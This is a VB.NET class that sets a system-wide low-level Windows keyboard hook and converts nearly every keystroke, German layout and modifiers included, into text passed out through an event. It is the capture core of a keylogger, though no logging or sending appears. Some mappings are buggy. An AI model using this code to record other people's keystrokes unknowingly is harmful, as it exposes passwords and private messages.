Imports System.Runtime.InteropServices

Public Class KeyboardHook
    Public Event KeyDown(ByVal sKey As String)

    Private Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hHook As Integer) As Integer
    Private Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Integer, ByVal lpfn As KeyboardHookDelegate, ByVal hmod As Integer, ByVal dwThreadId As Integer) As Integer
    Private Declare Function CallNextHookEx Lib "user32" (ByVal hHook As Integer, ByVal nCode As Integer, ByVal wParam As Integer, ByVal lParam As KBDLLHOOKSTRUCT) As Integer

    Public Structure KBDLLHOOKSTRUCT
        Public vkCode As Integer
        Public scanCode As Integer
        Public flags As Integer
        Public time As Integer
        Public dwExtraInfo As Integer
    End Structure

    Private Declare Function GetModuleHandleA Lib "kernel32.dll" (ByVal fakezero As IntPtr) As IntPtr
    ' Low-Level Keyboard Constants
    Private Const HC_ACTION As Integer = 0
    Private Const WH_KEYBOARD_LL As Integer = 13&
    Private KeyboardHandle As Integer

    ' Implement this function to block as many
    ' key combinations as you'd like
    Private i As Integer = 0
    Private Function IsHooked(ByVal HOOKSTRUCT) As Boolean

        Dim key As String = Nothing
        Try

            If HOOKSTRUCT.vkCode = 65 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "A"
                Else
                    key = "a"
                End If

            End If
            If HOOKSTRUCT.vkCode = 66 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "B"
                Else
                    key = "b"
                End If
            End If
            If HOOKSTRUCT.vkCode = 67 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "C"
                Else
                    key = "c"
                End If
            End If
            If HOOKSTRUCT.vkCode = 68 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "D"
                Else
                    key = "d"
                End If
            End If
            If HOOKSTRUCT.vkCode = 69 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "E"
                Else
                    key = "e"
                End If
                If My.Computer.Keyboard.AltKeyDown Then
                    key = "€"
                End If
            End If
            If HOOKSTRUCT.vkCode = 70 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "F"
                Else
                    key = "f"
                End If
            End If
            If HOOKSTRUCT.vkCode = 71 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "G"
                Else
                    key = "g"
                End If
            End If
            If HOOKSTRUCT.vkCode = 72 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "H"
                Else
                    key = "h"
                End If
            End If
            If HOOKSTRUCT.vkCode = 73 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "I"
                Else
                    key = "i"
                End If
            End If
            If HOOKSTRUCT.vkCode = 74 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "J"
                Else
                    key = "j"
                End If
            End If
            If HOOKSTRUCT.vkCode = 75 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "K"
                Else
                    key = "k"
                End If
            End If
            If HOOKSTRUCT.vkCode = 76 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "L"
                Else
                    key = "l"
                End If
            End If
            If HOOKSTRUCT.vkCode = 77 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "M"
                Else
                    key = "m"
                End If
            End If
            If HOOKSTRUCT.vkCode = 78 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "N"
                Else
                    key = "n"
                End If
            End If
            If HOOKSTRUCT.vkCode = 79 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "O"
                Else
                    key = "o"
                End If
            End If
            If HOOKSTRUCT.vkCode = 80 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "P"
                Else
                    key = "p"
                End If
            End If
            If HOOKSTRUCT.vkCode = 81 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "Q"
                Else
                    key = "q"
                End If
                If My.Computer.Keyboard.AltKeyDown Then
                    key = "@"
                End If
            End If
            If HOOKSTRUCT.vkCode = 82 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "R"
                Else
                    key = "r"
                End If
            End If
            If HOOKSTRUCT.vkCode = 83 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "S"
                Else
                    key = "s"
                End If
            End If
            If HOOKSTRUCT.vkCode = 84 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "T"
                Else
                    key = "t"
                End If
            End If
            If HOOKSTRUCT.vkCode = 85 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "U"
                Else
                    key = "u"
                End If
            End If
            If HOOKSTRUCT.vkCode = 86 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "V"
                Else
                    key = "v"
                End If
            End If
            If HOOKSTRUCT.vkCode = 87 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "W"
                Else
                    key = "w"
                End If
            End If

            If HOOKSTRUCT.vkCode = 88 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "X"
                Else
                    key = "x"
                End If
            End If
            If HOOKSTRUCT.vkCode = 89 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "Y"
                Else
                    key = "y"
                End If
            End If
            If HOOKSTRUCT.vkCode = 90 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "Z"
                Else
                    key = "z"
                End If
            End If

            If HOOKSTRUCT.vkCode = 49 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "!"
                Else
                    key = "1"
                End If
            End If
            If HOOKSTRUCT.vkCode = 50 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = """"
                Else
                    key = "2"
                End If
                If My.Computer.Keyboard.AltKeyDown Then
                    key = "²"
                End If
            End If
            If HOOKSTRUCT.vkCode = 51 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "§"
                Else
                    key = "3"
                End If
                If My.Computer.Keyboard.AltKeyDown Then
                    key = "³"
                End If
            End If
            If HOOKSTRUCT.vkCode = 52 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "$"
                Else
                    key = "4"
                End If
            End If
            If HOOKSTRUCT.vkCode = 53 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "%"
                Else
                    key = "5"
                End If
            End If
            If HOOKSTRUCT.vkCode = 54 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "&"
                Else
                    key = "6"
                End If
            End If

            If HOOKSTRUCT.vkCode = 55 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "/"
                Else
                    key = "7"
                End If
                If My.Computer.Keyboard.AltKeyDown Then
                    key = "{"
                End If
            End If
            If HOOKSTRUCT.vkCode = 56 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "("
                Else
                    key = "8"
                End If
                If My.Computer.Keyboard.AltKeyDown Then
                    key = "["
                End If
            End If
            If HOOKSTRUCT.vkCode = 57 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = ")"
                Else
                    key = "9"
                End If
                If My.Computer.Keyboard.AltKeyDown Then
                    key = "]"
                End If
            End If
            If HOOKSTRUCT.vkCode = 48 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "="
                Else
                    key = "0"
                End If
                If My.Computer.Keyboard.AltKeyDown Then
                    key = "}"
                End If
            End If
            If HOOKSTRUCT.vkCode = 222 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "Ä"
                Else
                    key = "ä"
                End If
            End If
            If HOOKSTRUCT.vkCode = 192 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "Ö"
                Else
                    key = "ö"
                End If
            End If
            If HOOKSTRUCT.vkCode = 186 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "Ü"
                Else
                    key = "ü"
                End If
            End If
            If HOOKSTRUCT.vkCode = 220 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "°"
                Else
                    key = "^"
                End If
            End If
            If HOOKSTRUCT.vkCode = 219 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "?"
                Else
                    key = "ß"
                End If
                If My.Computer.Keyboard.AltKeyDown Then
                    key = "\"
                End If
            End If
            If HOOKSTRUCT.vkCode = 187 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "*"
                Else
                    key = "+"
                End If
                If My.Computer.Keyboard.AltKeyDown Then
                    key = "~"
                End If
            End If
            If HOOKSTRUCT.vkCode = 191 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "'"
                Else
                    key = "#"
                End If
            End If
            If HOOKSTRUCT.vkCode = 221 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "`"
                Else
                    key = "´"
                End If
            End If

            If HOOKSTRUCT.vkCode = 226 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = ">"
                Else
                    key = "<"
                End If
            End If
            If HOOKSTRUCT.vkCode = 188 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = ";"
                Else
                    key = ","
                End If
            End If
            If HOOKSTRUCT.vkCode = 190 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = ":"
                Else
                    key = "."
                End If
            End If

            If HOOKSTRUCT.vkCode = 189 Then
                If My.Computer.Keyboard.ShiftKeyDown Then
                    key = "_"
                Else
                    key = "-"
                End If
            End If



            If HOOKSTRUCT.vkCode = 46 Then
                key = "[ENTF]"
            End If
            If HOOKSTRUCT.vkCode = 35 Then
                key = "[ENDE]"
            End If
            If HOOKSTRUCT.vkCode = 45 Then
                key = "[EINFG]"
            End If
            If HOOKSTRUCT.vkCode = 36 Then
                key = "[POS1]"
            End If
            If HOOKSTRUCT.vkCode = 33 Then
                key = "[BILD HOCH]"
            End If
            If HOOKSTRUCT.vkCode = 34 Then
                key = "[BILD RUNTER]"
            End If
            If HOOKSTRUCT.vkCode = 27 Then
                key = "[ESC]"
            End If
            If HOOKSTRUCT.vkCode = 9 Then
                key = "[TAB]"
            End If
            If HOOKSTRUCT.vkCode = 91 Then
                key = "[WINDOWS]"
            End If
            If HOOKSTRUCT.vkCode = 144 Then
                key = "[NUM]"
            End If

            If HOOKSTRUCT.vkCode = 37 Then
                key = "[Pfeiltaste links]"
            End If
            If HOOKSTRUCT.vkCode = 38 Then
                key = "[Pfeiltaste oben]"
            End If
            If HOOKSTRUCT.vkCode = 39 Then
                key = "[Pfeiltaste rechts]"
            End If
            If HOOKSTRUCT.vkCode = 40 Then
                key = "[Pfeiltaste uten]"
            End If





            If HOOKSTRUCT.vkCode = 8 Then
                key = "[Backspace]"
            End If
            If HOOKSTRUCT.vkCode = 13 Then
                key = "[ENTER]"
            End If
            If HOOKSTRUCT.vkCode = 32 Then
                key = " "
            End If

            If HOOKSTRUCT.vkCode = 96 Then
                key = "0"
            End If
            If HOOKSTRUCT.vkCode = 97 Then
                key = "1"
            End If
            If HOOKSTRUCT.vkCode = 98 Then
                key = "2"
            End If
            If HOOKSTRUCT.vkCode = 99 Then
                key = "3"
            End If
            If HOOKSTRUCT.vkCode = 100 Then
                key = "4"
            End If
            If HOOKSTRUCT.vkCode = 101 Then
                key = "5"
            End If
            If HOOKSTRUCT.vkCode = 102 Then
                key = "6"
            End If
            If HOOKSTRUCT.vkCode = 103 Then
                key = "7"
            End If
            If HOOKSTRUCT.vkCode = 104 Then
                key = "8"
            End If
            If HOOKSTRUCT.vkCode = 105 Then
                key = "9"
            End If
            If HOOKSTRUCT.vkCode = 111 Then
                key = "/"
            End If
            If HOOKSTRUCT.vkCode = 106 Then
                key = "*"
            End If
            If HOOKSTRUCT.vkCode = 109 Then
                key = "-"
            End If
            If HOOKSTRUCT.vkCode = 33 Then
                key = "+"
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
        RaiseEvent KeyDown(key)
    End Function

    Private Function KeyboardCallback(ByVal Code As Integer, _
      ByVal wParam As Integer, _
      ByRef lParam As KBDLLHOOKSTRUCT) As Integer

        If (Code = HC_ACTION) Then
            If wParam = &H100 Or wParam = &H104 Then
                If (IsHooked(lParam)) Then
                    Return 1
                End If
            End If
        End If
        Return 0

    End Function


    Private Delegate Function KeyboardHookDelegate(ByVal Code As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer
    <MarshalAs(UnmanagedType.FunctionPtr)> Private callback As KeyboardHookDelegate
    Delegate Sub d1()
    Public Sub Start()
        callback = New KeyboardHookDelegate(AddressOf KeyboardCallback)
        KeyboardHandle = SetWindowsHookEx(WH_KEYBOARD_LL, callback, GetModuleHandleA(IntPtr.Zero), 0)
        'End If
        
    End Sub

    Private Function Hooked()
        Hooked = KeyboardHandle <> 0
    End Function

    Public Sub Stopp()
        If (Hooked()) Then
            Call UnhookWindowsHookEx(KeyboardHandle)
        End If
    End Sub
End Class
